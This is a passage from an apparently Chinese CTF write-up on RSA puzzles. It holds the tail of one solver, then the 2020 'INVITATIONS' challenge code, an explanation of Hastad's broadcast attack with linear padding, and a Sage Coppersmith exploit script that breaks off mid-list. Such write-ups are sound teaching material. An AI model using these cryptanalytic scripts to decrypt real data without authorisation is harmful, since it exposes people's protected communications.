11807668285253476335993112649125478311738138284032009521013160232275155591439056104050712447640428132619606976587476242139778581733169915977009541156271158342164308850183882293808973497182420010031579067660977663894542027297739371427053469215030263817360875451422844176774669484378609912250701562139454836788798283646984193408478412076837926365908454580066517380897820350918189254782926664771936070107395821284187885892036352109035393564580351743381904585469190706683218284347728580797326563996730184944085618477815023279614804702457729169640438408479963581615968900059881783129713048355206267321472950141238916990289<br>phi= 11807668285253476335993112649125478311738138284032009521013160232275155591439056104050712447640428132619606976587476242139778581733169915977009541156271158342164308850183882293808973497182420010031579067660977663894542027297739371427053469215030263817360875451422844176774669484378609912250701562139454836788580954283961789345480162099667001543891543639039785702888420923141077344358421051350061532584618771565302075962527648516570054467566143564854760959148274897390714017585220094430947903853829077089810614861107089070658414503772365171320735613805448738756377532942888788137666255740398790486415370724509249593956<br>     <br>print(factorize_multi_prime(n,phi))<br>p=109251812397373321369840755208338684181849016249638331267293943483115497998725084726738929391662966344551120589566300806536096548160787172237706693859608475141219078669813672240834436097740939389436503141021125884696328239129598176499232703067484613497368721713418450511690584287062214763737382684815118290807<br>q=108077550625030741628409221962586137835061924777093346742105484293996412425780528695135608131114083374334689339942402785929242548853421006289436932461307334151285188092694814125544224045160168464838500475686808324260061959555765821820470091607030229362222645403574544480356208327745262071320196731914549105527<br>c=7320983754394577422767542259069116006114676957581611253208089569490712064263822719681906219830045070027417890563005314255698660920759511532031914399521431010299257046526287119522646336307583924582732194043891855691431909500109014302908312283511965320377811140085483883126526462467293815637138718444001931483069474449989528839243687527037766658696775697609190493251942630904142633135051494201917324487853767845670807311896759009183844195818162749380637909781931403232226599915889508138332312516115335987268671038564169230604383642551512237979390401177728387916170497777974947392809240193434636218076335466512033333461<br>e=5281486869323390978888423235641733430226678655686523392509714694751699050972120246916705000659875362083798615103093121939019773338011435050637066804667485505484551148317473841662442079996914658971301530910391768225029937660420184269526291001532582856000498690281601708552422507554114650938378386138884675333079129219306840932269967053765809850586002685750596186872500960539502358573116582308035530522367769717985694159855985288721479249298872468268929957454831663164937357314947859985362524031645431354657428639172589105754006273997415340441064909574647647141996659760272695449996972251425797398960494913207372272501<br>d=invert(e,(p-1)*(q-1))<br>print(long_to_bytes(pow(c,d,p*q)).hex())<br></code></pre></td></tr></table></figure><h1 id="羊城杯-2020invitations"><a class="markdownIt-Anchor" href="#羊城杯-2020invitations"></a> [羊城杯 2020]INVITATIONS</h1><h2 id="题目-19"><a class="markdownIt-Anchor" href="#题目-19"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, bytes_to_long<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> random<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">s,i</span>):<br>    <span class="hljs-keyword">return</span> i * <span class="hljs-built_in">pow</span>(<span class="hljs-number">3</span>,s.bit_length()) + s**<span class="hljs-number">2</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_N</span>():<br>    <span class="hljs-keyword">return</span> getPrime(<span class="hljs-number">512</span>) * getPrime(<span class="hljs-number">512</span>)<br><br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">54</span><br>invite = bytes_to_long(flag)<br><br>e_list = [random.choice([<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>)]<br>N_list = [gen_N() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>)]<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./invitations&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):<br>        invis = <span class="hljs-built_in">pow</span>(pad(invite,i+<span class="hljs-number">1</span>),e_list[i],N_list[i])<br>        f.write(<span class="hljs-string">&#x27;Invitation%d: %d \n&#x27;</span>%(i+<span class="hljs-number">1</span>,invis))<br><br>    f.write(<span class="hljs-string">&#x27;Wait a minute! \n&#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):<br>        f.write(<span class="hljs-string">&#x27;[e%d,N%d]: [%d,%d]\n&#x27;</span>%(i+<span class="hljs-number">1</span>,i+<span class="hljs-number">1</span>,e_list[i],N_list[i]))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Invitation1: 2726880165485794753015221799903015469859604350960070462389832770775190258204902795671085685627736110579803076064313238826997962227132535666379117171603278182417820587346210511971127809627876548907651538393737303011542136469304569045407566630840981287558726831003180186144633381044057099863505591978316576331 </span><br><span class="hljs-string">Invitation2: 52844103418322232725177561034428083147725292376614668718220523666259095447694889972949103379829470432332480992707892007073319952276490981511612735696207090391646476749895265951654074573797235607971038590694835782189124391368712277613425337912212240432011011071881837734857743183367019103096901117395938690572 </span><br><span class="hljs-string">Invitation3: 129274519334082165644106292383763271862424981496822335330342328217347928093592453953990448827969549377883054831490973006383371688359344675312001881631556371220779971357039899721241880304156884612458373310254854821837978876725801047977081900824202659636258168216028784656056334358157381820784576207338479493823 </span><br><span class="hljs-string">Invitation4: 56852637683122735164568970875066131746509133403072354742812890131597805562226047560392266004050592533316793038372256396537829143627478792510526346644756590135871716813976819138793368813440386409129373327577756689416990858633825538766694242123021009535005392002648416127869437948525458000795891155650312894218 </span><br><span class="hljs-string">Invitation5: 24933581882539143383805596779774030477763512752520375486982562296903063067503747125713029403793101373585417342942950790457235350083784905974251188305010098928244056980941419687746319300184530161551239060873604405554973757867815783641391659818219177575212360602858057667033472530286856616676363511656764861866 </span><br><span class="hljs-string">Invitation6: 7491476722927235473944826192371870577426352529433316210668760004930228302472920679959949471665143237333356259221787618020560963460668303766902416340056446225333025453011937952801159044781738493694911250765543392959285625650198325627539546777165439291150376527665779894748453633305704694635029402487576286720 </span><br><span class="hljs-string">Invitation7: 46994515206702516116723205176259615067102717099690856936455392000070823814544052445278146449282379251128163008476565339875497253781717590664182753552262233895322322657625202522815172174432182181682631558679857615390973133346476079858014623412440411395083299226947371458955797627789607079672039131280242758091 </span><br><span class="hljs-string">Invitation8: 8140023566779187828652447593867705813386781164538611122714708931585587727699213769519135028841126072130625547328311301696554048174772606261707345115571968105138543476580875347239912760797035694220505996377127309341770427102697008350472060971360460756799310951343070384766137332401117333917901167639276168214 </span><br><span class="hljs-string">Invitation9: 8385766476371753553977800353128766303065572190592509929058486984964439147256960481698015327599879810752997804957814193113184978479627127131318723231581432235920975812354556190022727375961505764199831794239507708621401077801662954349957627630157786326057704380977697746043041515978455150985893713987598581167 </span><br><span class="hljs-string">Invitation10: 25434511525127530194830986592289179576070740435049947678930286998924519588985583799757299734846614343604661534391991096353170465467791358514448923161460366596251448937540153262731348684727026598527904328268639060306102090278287818149679940661579357649191023269947102746200467430583428889484549034314463114080 </span><br><span class="hljs-string">Invitation11: 9435583236354598287661880148272717764447540972316605192855157484524753847806158586224733743434644389385148450722945845355791145016665856388503878165725148745517696840251674049929524448078129458846254866804153080766917319923905682824180976106679633180818527967145571143203594244851742143986040226240019541346 </span><br><span class="hljs-string">Invitation12: 42653412322252936189967169320174001935456500265020295381235749570735595316912049949245536609634786767873783560657460914097412643705264107040560389003526999720357122717443215007182355846769697457076620951388839672721527406861414375682603373503445636748304326212654026233985520038237509837611802457243967916967 </span><br><span class="hljs-string">Invitation13: 50163996128508874413636370533324079468893191391677157815578286348174669089976633631417431754505804284298354381223186985949160012660340790440711469708712479223582014168361667639570586425626182863344576254691662799762136734638820942002509860333817967414572002225418810272184173820322912928927789061077468994953 </span><br><span class="hljs-string">Invitation14: 55181712049788569218094734913693030675622116883683701002270524678292896232044695586872582672159854063365203462010143885417632291300773699604618481578372258936513301821561273604986211363808846581429372811764533701610119228124866223770584249909429743735157839245622925997548481946831963456454939343358587988983 </span><br><span class="hljs-string">Wait a minute! </span><br><span class="hljs-string">[e1,N1]: [5,90361246179367799606636863352077187566064794796456461177972505143929614628873639223638940051613378291778175724735519020067052934403115774679961661481160141872257338930620863078688082915958381094674423803586734810828570206667419458295735288184697613296663226516640069281835035704453280781694226293902395215269]</span><br><span class="hljs-string">[e2,N2]: [5,83202136479583179143205059354864808364257451670037867814548678142629716115373207061455185843132942837300718212806534861585785041547496145915392175827479376792813058845422044909477892978293495048968520853100992244672416436363272286740068846609018921112995562647093952700070707124842514243806528982910520604851]</span><br><span class="hljs-string">[e3,N3]: [3,146694460234280339612721415368435987068740712812770728817136582256341063038147863645902264969297892447333024201649306207442798919845916187823646745721109151386096190207317810424580842120750075213595282979568495342617919336417068886973047979116994072272482630372638964064972815256237040541007947708358680368391]</span><br><span class="hljs-string">[e4,N4]: [7,145212137982314671207105886550619275956842416412937060552686822638155412950680057688522218990023473104787006548449644240065948769143660097622695125682017688804838701293738298008178105057147539522368965730223561911750657089352591376219016726977232279206451303896573325330139830440927228125810665303608828462177]</span><br><span class="hljs-string">[e5,N5]: [5,69335368232766044823545542187513771534967902179150417021053554241638095909666122935053210964003511014870892979205875153115719406287728162111662254890513324436473313860142126335197489227724691042286796058111753972895113145188906829975189506125997319609609974126645475084944238417929532560409919420929255247813]</span><br><span class="hljs-string">[e6,N6]: [5,93889543065608951579836429313520485233295158467296710329997599807630401722519056218864031741675898621375735347229494633577571323057785261271373295860331130588582231771193563731092603614818963592931492474988532068227153492022582339704874613690044001529412669510094771064646843676765163737757104643318364446839]</span><br><span class="hljs-string">[e7,N7]: [7,66174700839404221060785862467924299511645570336361033287335855493589093141782896451863402373425798838446538369142584932156150350565382116869446083154097803842190010954019565857767923584979615770650706675094209251111816761431713779074557571353022624477001770694207393369796369620048999514683357963227119554487]</span><br><span class="hljs-string">[e8,N8]: [3,65031485534704406281490718325237831433086480239135617407356760819741796565231283220528137697949585150709734732370203390254643835828984376427852793969716489016520923272675090536677771074867975287284694860155903327351119710765174437247599498342292671117884858621418276613385329637307269711179183430246951756029]</span><br><span class="hljs-string">[e9,N9]: [5,72454311940971803130612024751128556938725737742029062979349607787083978826668706819793864356790325653817555839762732164812521831864626411495002267399139766907846534945632792910468487287154661692733986224962564621615361536373173705359255153606552352581704159462310354407361311378558150604159961029937052901709]</span><br><span class="hljs-string">[e10,N10]: [3,126172075578367446151297289668746433680600889845504078949758568698284471307000358407453139846282095477016675769468273204536898117467559575203458221600341760844973676129445394999861380625435418853474246813202182316736885441120197888145039130477114127079444939102267586634051045795627433724810346460217871661901]</span><br><span class="hljs-string">[e11,N11]: [3,75691424835079457343374072990750986689075078863640186724151061449621926239051140991748483370587430224317778303489124525034113533087612981452189061743589227565099659070008017454957304620495920813121234552401715857719372861565651204968408267740732475458128601061676264465241188491988485848198323410127587280471]</span><br><span class="hljs-string">[e12,N12]: [7,88063052818271125442049408332053226451497067720511502513828848476569985821115735898897947439175727789641390104005400308936768495751619165683456550165811034670341697022370415202614387373196086237042577737857259724530596416810462125219296930758592032765843338961894697491961439584875235274163072466474940670589]</span><br><span class="hljs-string">[e13,N13]: [5,86478932133708863968749977073639049451666195461247968321317885106346907736572028122496476049748246757185316498949163898915427948597498506162230927380667345132742891001640364064647368394822175742973968167028656790729030556005407153405955458636780270673780720333871959638216946584461925553782697695137132507853]</span><br><span class="hljs-string">[e14,N14]: [7,137641493263428303662262187582231235637921833879366309318941383348412296182252654397496377642861646991438721153462001357875169325595544056465299787575422581289053630686684843044593163904089201855371863459503176022957832807726507152235818181000484878683030989944063049622694810207054366378176225221479695833371]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="分析-19"><a class="markdownIt-Anchor" href="#分析-19"></a> 分析</h2><h3 id="加密过程"><a class="markdownIt-Anchor" href="#加密过程"></a> 加密过程：</h3><p>从3,5,7中随机选择14次，当作e，然后正常生成14个n。</p><p>循环14次，每次先对m进行pad，pad的值跟i和flag长度有关。这里flag长度是固定值。</p><p>根据flag头“GWTH{”（比赛时肯定能知道），flag长度，进行计算。</p><p>pad的过程可以当作是线性填充，不过对m进行了平方，这不影响。</p><p>pad之后就是正常的rsa加密。</p><h3 id="解密过程"><a class="markdownIt-Anchor" href="#解密过程"></a> 解密过程：</h3><p>我找了xenny师傅的模板（可以直接pip install xenny，然后去site-packages里面找），还有[RSA Coppersmith相关攻击 | NonupleBroken](<a href="https://nonuplebroken.com/2019/11/21/RSA">https://nonuplebroken.com/2019/11/21/RSA</a> Coppersmith相关攻击/#broadcast-attack-with-linear-padding)这里的模板，没有理解原理，我就直接上结论了。</p><p>这里先放几篇文章</p><blockquote><p>paper:<a href="https://crypto.stanford.edu/~dabo/pubs/papers/RSA-survey.pdf">RSA-survey.pdf (stanford.edu)</a></p><p><a href="https://github.com/ashutosh1206/Crypton/blob/master/RSA-encryption/Attack-Hastad-Broadcast/README.md">Crypton/RSA-encryption/Attack-Hastad-Broadcast/README.md at master · ashutosh1206/Crypton (github.com)</a></p></blockquote><p>先放一下步骤</p><blockquote><p>Exploit in a Nutshell:</p><ol><li>Calculate N = n1<em>n2</em>…</li><li>Calculate each element T[j] as per the above conditions using CRT</li><li>Assign P. = PolynomialRing(Zmod(N))</li><li>g[j] = (i*(2^m) + x)^e - c, where the message is padded using the above conditions</li><li>Assign g = Sum_of(T[j] * g[j])</li><li>Check if g is a monic polynomial, if not transform it into a monic polynomial</li><li>Find small roots of g and check if that is the flag</li></ol></blockquote><p>首先对同一个消息m进行了多次加密，虽然这里对m进行了线性填充，无法直接使用中国剩余定理，但是有多组密文，我们仍然可以求解，这也就是SMUPE问题。在这题中，我们先进行了预处理（参考xenny师傅），然后调用了smupe函数进行求解。</p><p>根据 Alexander May and Maike Ritzenhofen 于 2008 年的结论，对于 SMUPE-problem（也就是这题的问题），当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></msubsup><mfrac><mn>1</mn><msub><mi>e</mi><mi>i</mi></msub></mfrac><mo>&gt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\sum_{i=1}^k \frac{1}{e_i} &gt; 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4341079999999997em;vertical-align:-0.44509999999999994em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9890079999999999em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 时可解。所以我仍然借助了xenny师傅的预处理，利用x_change函数求解满足条件的几组密文。</p><p>1、计算N</p><p>2、利用CRT计算T[j]，在原理解释说t[i]=1 if i=j, t[i]=0 if i≠j，所以我这里就依葫芦画瓢了。</p><p>3、建立在N下的模多项式</p><p>4、根据加密使用的线性填充，计算gi，顺便乘上T[j]</p><p>5、monic将g的首项转为1</p><p>6、最后通过small_roots求解m</p><h2 id="exp-19"><a class="markdownIt-Anchor" href="#exp-19"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">import</span> gmpy2<br><br>_sage_const_1 = Integer(<span class="hljs-number">1</span>);<br>_sage_const_0 = Integer(<span class="hljs-number">0</span>);<br>_sage_const_1p = RealNumber(<span class="hljs-string">&#x27;1.&#x27;</span>);<br>_sage_const_1000 = Integer(<span class="hljs-number">1000</span>);<br>_sage_const_7p = RealNumber(<span class="hljs-string">&#x27;7.&#x27;</span>);<br>_sage_const_8 = Integer(<span class="hljs-number">8</span>);<br>_sage_const_2 = Integer(<span class="hljs-number">2</span>)<br>__author__ = <span class="hljs-string">&#x27;x3nny&#x27;</span><br>x_calc = <span class="hljs-keyword">lambda</span> x, n: ((n - x) // x + _sage_const_1, (n - x) % x)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">x_change</span>(<span class="hljs-params">e_list</span>):<br>    e_list = [(i, e_list[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(e_list))]<br>    e_list = <span class="hljs-built_in">sorted</span>(e_list, key=<span class="hljs-keyword">lambda</span> x: x[_sage_const_1])<br>    <span class="hljs-built_in">sum</span> = max_i = _sage_const_0<br>    indexs = []<br>    exponents = []<br>    <span class="hljs-keyword">for</span> index, exp <span class="hljs-keyword">in</span> e_list:<br>        <span class="hljs-built_in">sum</span> += _sage_const_1 / exp<br>        indexs.append(index)<br>        <span class="hljs-keyword">if</span> exp &gt; max_i:<br>            max_i = exp<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span> &gt; _sage_const_1p:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(indexs)):<br>        exponents.append(x_calc(e_list[i][_sage_const_1], max_i))<br>    <span class="hljs-keyword">return</span> indexs, exponents<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">modinv</span>(<span class="hljs-params">a, m</span>):<br>    <span class="hljs-keyword">return</span> gmpy2.invert(gmpy2.mpz(a), gmpy2.mpz(m))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CRT</span>(<span class="hljs-params">n, a</span>):<br>    N = reduce(<span class="hljs-keyword">lambda</span> x, y: x * y, n)<br>    result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> n_i, a_i <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(n, a):<br>        p = N / n_i<br>        s = modinv(p, n_i)<br>        result += a_i * s * p<br>    <span class="hljs-keyword">return</span> result % N<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">smupe</span>(<span class="hljs-params">c_list, n_list, a_list, b_list, e_list, bits=_sage_const_1000, beta=_sage_const_7p / _sage_const_8</span>):<br>    indexs, exponents = x_change(e_list)<br>    <br>    N = reduce(<span class="hljs-keyword">lambda</span> x, y: x * y, [n_list[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> indexs])<br>    <br>    T=[]<br>    n=[]<br>    tj=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(indexs)):<br>        n.append(n_list[indexs[i]])<br>        tj.append([<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(indexs))])<br>        tj[i][i]=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(indexs)):<br>        T.append(CRT(n,tj[i]))<br>        <br>    P.&lt;x&gt; = PolynomialRing(Zmod(N))<br>    g=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(indexs)):<br>        g+=((a_list[indexs[i]] * x + b_list[indexs[i]]) ** e_list[indexs[i]] - c_list[indexs[i]])*T[i]<br>    g = g.monic()<br>    m=g.small_roots(X=<span class="hljs-number">2</span>**bits, beta=beta)<br>    <span class="hljs-keyword">if</span> m:<br>        <span class="hljs-keyword">return</span> m[_sage_const_0]<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br>Invitation1 = <span class="hljs-number">2726880165485794753015221799903015469859604350960070462389832770775190258204902795671085685627736110579803076064313238826997962227132535666379117171603278182417820587346210511971127809627876548907651538393737303011542136469304569045407566630840981287558726831003180186144633381044057099863505591978316576331</span> <br>Invitation2 = <span class="hljs-number">52844103418322232725177561034428083147725292376614668718220523666259095447694889972949103379829470432332480992707892007073319952276490981511612735696207090391646476749895265951654074573797235607971038590694835782189124391368712277613425337912212240432011011071881837734857743183367019103096901117395938690572</span> <br>Invitation3 = <span class="hljs-number">129274519334082165644106292383763271862424981496822335330342328217347928093592453953990448827969549377883054831490973006383371688359344675312001881631556371220779971357039899721241880304156884612458373310254854821837978876725801047977081900824202659636258168216028784656056334358157381820784576207338479493823</span> <br>Invitation4 = <span class="hljs-number">56852637683122735164568970875066131746509133403072354742812890131597805562226047560392266004050592533316793038372256396537829143627478792510526346644756590135871716813976819138793368813440386409129373327577756689416990858633825538766694242123021009535005392002648416127869437948525458000795891155650312894218</span> <br>Invitation5 = <span class="hljs-number">24933581882539143383805596779774030477763512752520375486982562296903063067503747125713029403793101373585417342942950790457235350083784905974251188305010098928244056980941419687746319300184530161551239060873604405554973757867815783641391659818219177575212360602858057667033472530286856616676363511656764861866</span> <br>Invitation6 = <span class="hljs-number">7491476722927235473944826192371870577426352529433316210668760004930228302472920679959949471665143237333356259221787618020560963460668303766902416340056446225333025453011937952801159044781738493694911250765543392959285625650198325627539546777165439291150376527665779894748453633305704694635029402487576286720</span> <br>Invitation7 = <span class="hljs-number">46994515206702516116723205176259615067102717099690856936455392000070823814544052445278146449282379251128163008476565339875497253781717590664182753552262233895322322657625202522815172174432182181682631558679857615390973133346476079858014623412440411395083299226947371458955797627789607079672039131280242758091</span> <br>Invitation8 = <span class="hljs-number">8140023566779187828652447593867705813386781164538611122714708931585587727699213769519135028841126072130625547328311301696554048174772606261707345115571968105138543476580875347239912760797035694220505996377127309341770427102697008350472060971360460756799310951343070384766137332401117333917901167639276168214</span> <br>Invitation9 = <span class="hljs-number">8385766476371753553977800353128766303065572190592509929058486984964439147256960481698015327599879810752997804957814193113184978479627127131318723231581432235920975812354556190022727375961505764199831794239507708621401077801662954349957627630157786326057704380977697746043041515978455150985893713987598581167</span> <br>Invitation10 = <span class="hljs-number">25434511525127530194830986592289179576070740435049947678930286998924519588985583799757299734846614343604661534391991096353170465467791358514448923161460366596251448937540153262731348684727026598527904328268639060306102090278287818149679940661579357649191023269947102746200467430583428889484549034314463114080</span> <br>Invitation11 = <span class="hljs-number">9435583236354598287661880148272717764447540972316605192855157484524753847806158586224733743434644389385148450722945845355791145016665856388503878165725148745517696840251674049929524448078129458846254866804153080766917319923905682824180976106679633180818527967145571143203594244851742143986040226240019541346</span> <br>Invitation12 = <span class="hljs-number">42653412322252936189967169320174001935456500265020295381235749570735595316912049949245536609634786767873783560657460914097412643705264107040560389003526999720357122717443215007182355846769697457076620951388839672721527406861414375682603373503445636748304326212654026233985520038237509837611802457243967916967</span> <br>Invitation13 = <span class="hljs-number">50163996128508874413636370533324079468893191391677157815578286348174669089976633631417431754505804284298354381223186985949160012660340790440711469708712479223582014168361667639570586425626182863344576254691662799762136734638820942002509860333817967414572002225418810272184173820322912928927789061077468994953</span> <br>Invitation14 = <span class="hljs-number">55181712049788569218094734913693030675622116883683701002270524678292896232044695586872582672159854063365203462010143885417632291300773699604618481578372258936513301821561273604986211363808846581429372811764533701610119228124866223770584249909429743735157839245622925997548481946831963456454939343358587988983</span> <br><br>e1,N1 = [<span class="hljs-number">5</span>,<span 